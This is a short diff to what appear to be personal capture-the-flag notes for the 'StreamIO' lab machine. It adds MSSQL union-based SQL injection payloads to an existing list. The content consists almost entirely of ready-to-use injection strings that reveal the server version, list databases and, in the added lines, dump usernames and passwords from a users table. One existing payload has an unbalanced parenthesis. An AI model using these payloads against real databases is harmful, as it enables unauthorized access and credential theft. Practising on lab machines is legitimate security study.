@@ -446,6 +446,8 @@ host machine
 Used in ```StreamIO```
 
 ```mssql
+/* testing, The order of the movie list is different */
+';--
 /* check version */
 ' union SELECT 1, select @@version), 3, '4', '5', '6';--
 ' union SELECT 1, '2', (select COUNT(*) from sys.sysdatabases), '4', '5', '6';--
@@ -453,4 +455,7 @@ Used in ```StreamIO```
 ' union SELECT 1, (select STRING_AGG(name, ',') from sys.sysdatabases), 3, '4', '5', '6' ;--
 /* show all databases, version < SQL Server 2017 */
 ' union SELECT 1,(STUFF((select ',' + name from sys.sysdatabases FOR XML PATH('')), 1, 1, '')), 3, '4', '5', '6';--
+
+/* get the usernames and passwords */
+' union SELECT 1, (SELECT STRING_AGG(username, ',') + STRING_AGG(password, ',') FROM streamio.dbo.users), 3, '4', '5', '6';--
 ```
